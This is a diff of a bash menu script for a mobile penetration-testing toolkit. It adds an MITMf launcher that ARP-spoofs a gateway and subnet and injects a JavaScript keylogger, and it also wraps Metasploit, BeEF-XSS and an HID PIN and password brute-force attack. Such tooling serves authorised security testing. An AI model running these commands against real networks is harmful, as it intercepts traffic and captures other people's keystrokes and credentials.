@@ -51,8 +51,8 @@ f_wlan1check
 echo "				WIRELESS ATTACKS MAIN MENU"
 echo ""
 echo ""
-echo "[1]	Wifite"
-echo "[2]	Kismet"
+echo "[1]	Wifite - Auotmated Wireless Auditor"
+echo "[2]	Kismet - Wireless network detector, sniffer, IDS"
 echo ""
 echo "[0]	Exit"
 echo ""
@@ -123,11 +123,14 @@ if [ "$CONT" == "y" ]; then
 	killall gpsd
 	f_giskismet;
 	wipe -f -P 5 /tmp/gps
+	clear
+	f_wireless_attacks;
 else
   echo "Running Kismet WITHOUT GPS support..."
   sleep 2
   kismet -g;
   clear
+  f_wireless_attacks;
 fi
 }
 
@@ -169,6 +172,8 @@ else
   echo "All files copied successfully!";
 fi
 }
+
+
 ##########################   SNIFFING MENU     ###############################
 f_sniffing(){
 clear
@@ -253,7 +258,10 @@ if [ ! -d "/var/lib/openvas/" ]; then
 	read -p "Would you like to install OpenVas (1GB+ space needed)? (y/n): " installopenvas
 		if [ "$installopenvas" == "y" ]; then
 			apt-get update && apt-get install -y openvas
-			openvas-setup && openvas-scapdata-sync && openvas-certdata-sync && openvas-check-setup && openvas-stop
+			openvas-setup && openvas-scapdata-sync && openvas-certdata-sync && openvas-check-setup && openvas-stop 
+			openvasmd --create-user=admin --role=Admin
+			read -p "Enter OpenVas admin user password: " openvas_pass
+			openvasmd --user=admin --new-password="$openvas_pass"
 		fi
 fi
 clear
@@ -286,6 +294,7 @@ echo ""
 echo "[1]	Metasploit"
 echo "[2]	Beef-XSS"
 echo "[3]	Social-Engineering Toolkit"
+echo "[4]	MITMf - Man-In-The-Middle attacks"
 echo ""
 echo "[0]	Exit to main menu"
 echo ""
@@ -293,15 +302,42 @@ read -p "Choice: " webchoice
 
 case $webchoice in
 1) clear; echo "Msfconsole may take up to 5 minutes to load, please wait..."; service postgresql start; service metasploit start; msfconsole; f_exploitation ;;
-2) clear; service beef-xss start; echo "Open browser to local ip on port 3000 (beef/beef)"; sleep 8; f_exploitation ;;
+2) clear; service beef-xss start; echo "Open browser to http://127.0.0.1:3000/ui/panel (beef/beef)"; sleep 8; f_exploitation ;;
 3) clear; setoolkit ; f_exploitation ;;
+4) clear; trap 'f_exploitation' 2; f_mitmf ;;
 0) clear; f_interface ;;
 *) echo "Incorrect choice..." ;
 esac
 }
 
-f_metasploit(){
-msf4
+f_mitmf(){
+clear
+read -p "Enter Interface: " -e -i "wlan0" mitmf_interface
+read -p "Enter Gateway IP: " -e -i "192.168.1.1" mitmf_routerip
+read -p "Enter Target IP: " -e -i "192.168.1.0/24" mitmf_targetip
+if ps ax | grep -v grep | grep beef-xss > /dev/null
+	then
+		echo "Beef-xss is running.  Will load autobeef..."
+		mitmf_startbeef=--beefauto
+		sleep 3
+	else
+		echo "Beef-xss is not running.  Would you like to start? (y/n) " mitmf_beefstart 
+		if 	[ "$mitmf_beefstart" == "y" ]; then
+			echo "Starting beef-xss..."
+			service beef-xss start
+			mitmf_startbeef=--beefauto
+			sleep 5
+		else
+			mitmf_startbeef=""
+		fi
+fi
+cd /opt/MITMf
+echo "Logs saved to /captures/sslstrip/mitmf.log"
+echo ""
+echo "[*] ------------------------------------------------------"
+# Uncomment when beef-xss for MITMf is fixed #
+#python mitmf.py --spoof --arp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip $mitmf_startbeef --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
+python mitmf.py --spoof --arp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
 }
 ########################## REVERSE MENU ################################
 f_reverse(){
@@ -563,15 +599,15 @@ echo "[1] Generate VPN Server Keys *will remove previous old keys"
 echo "[2] Generate Client Keys"
 echo "[3] Export Client Keys to sdcard"
 echo ""
-echo "[0] Exit to Settings Menu"
-echo -n "Enter your menu choice [1-6]: "
+echo "[0] Exit to Main Menu"
+echo -n "Enter your menu choice [1-3]: "
 read -p "Choice: " vpnkeychoice
 
 case $vpnkeychoice in
 1) f_server_key ;;
 2) f_domain_clientkey ;;
 3) f_exportkeys ;;
-0) f_settings ;;
+0) f_interface ;;
 *) echo "Incorrect choice..." ;
 esac
 }
@@ -805,32 +841,32 @@ echo "				HID ATTACKS MENU"
 echo ""
 echo "[1] Dictionary based brute force attack"
 echo ""
-echo "[Q] Exit to main menu"
+echo "[0] Exit to main menu"
 echo ""
 read -p "Choice:" hidchoice
 
 case $hidchoice in
 1) clear; f_hid_dic ;;
-q) f_interface ;;
+0) f_interface ;;
 *) f_hid ;;
 esac
 }
 
 f_hid_dic(){
 clear
-cd ~/dictionaries
-echo "Pick a Dictionary: " dicselect
+cd /opt/dic
+echo "Pick a Dictionary: " dictselect
 echo "[1] Common Passwords"
 echo "[2] 4 digit PIN Numbers"
 echo ""
-echo "[Q] Back to HID Menu"
+echo "[0] Back to HID Menu"
 echo ""
-read -p "Selection: " dicselect
+read -p "Selection: " dictselect
 
-case $dicselect in
-	1) /usr/bin/hid-dic 1; f_hid;;
-	2) /usr/bin/hid-dic.sh 2; f_hid;;
-	q) clear; f_hid;;
+case $dictselect in
+	1) hid-dic 1; f_hid;;
+	2) hid-dic 2; f_hid;;
+	0) clear; f_hid;;
 	*) clear; f_hid_dic;;
 esac
 }
@@ -844,6 +880,7 @@ echo "[1] Configure Timezone"
 echo "[2] Create Metasploit User and Database"
 echo "[3] Macchanger"
 echo "[4] Install NodeJS"
+echo ""
 echo "[0] Exit to main menu"
 echo ""
 read -p "Choice:" settingschoice
@@ -859,15 +896,27 @@ esac
 }
 
 f_nodejs(){
+clear
 cd /tmp
-echo "Downloading install script"
-wget https://raw.github.com/creationix/nvm/master/install.sh && chmod +x install.sh
+echo "Downloading Node Version Manager"
+git clone https://github.com/creationix/nvm.git ~/.nvm && cd ~/.nvm && git checkout `git describe --abbrev=0 --tags`
 source ~/.nvm/nvm.sh
+chmod +x ~/.nvm/nvm.sh ~/.nvm/nvm-exec
+# We use bash_profile because .bashrc does not load nvm.sh on opened session
+echo 'export NVM_DIR="/root/.nvm"' >> ~/.bash_profile
+echo '[ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"'  >> ~/.bash_profile
 echo "Starting NodeJS install.  This will take a while..."
 sleep 5
-nvm install 0.11.11
-rm -rf ~/.nvm
-rm -rf /tmp/install.sh
+nvm install 0.10.32 --without-snapshot
+echo "nvm use v0.10.32 > /dev/null" >> ~/.bash_profile
+npm config set user 0
+npm config set unsafe-perm true
+source ~/.bash_profile # Source bash_profile to update location of /bin for npm/nvm
+echo "NodeJS succesfully installed!  Give it a try! (may require restart)"
+echo ""
+echo "Suggested application: localtunnel.me"
+echo "npm install -g localtunnel"
+sleep 5
 f_settings
 }
 
@@ -919,6 +968,7 @@ echo "[2]	wlan1 (External wireless USB)"
 echo "[3]	rmnet0 (3G)"
 echo "[4]	eth0 (Ethernet)"
 echo "[5]	rndis0 (USB > Ethernet)"
+echo "[6]	usb0 (USB > Ethernet)" # N7 2013 creates usb0 when tethering/badusb
 echo ""
 read -p "Choice: " sniffinterface
 
@@ -928,6 +978,7 @@ case $sniffinterface in
 3) clear; pickinterface=rmnet0 ;;
 4) clear; pickinterface=eth0 ;;
 5) clear; pickinterface=rndis0 ;;
+6) clear; pickinterface=usb0 ;;
 *) echo "Incorrect choice..." ;;
 esac
 }
